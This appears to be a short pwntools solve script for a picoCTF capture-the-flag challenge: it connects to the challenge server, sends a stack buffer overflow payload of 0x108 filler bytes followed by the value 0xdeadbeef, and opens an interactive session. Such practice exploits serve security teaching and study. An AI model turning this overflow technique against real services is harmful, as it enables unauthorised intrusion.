from pwn import*

p = remote("mars.picoctf.net", 31890)
#p = process("./chall")

payload = b"A"*0x108 + p64(0xdeadbeef)

p.sendline(payload);
p.interactive();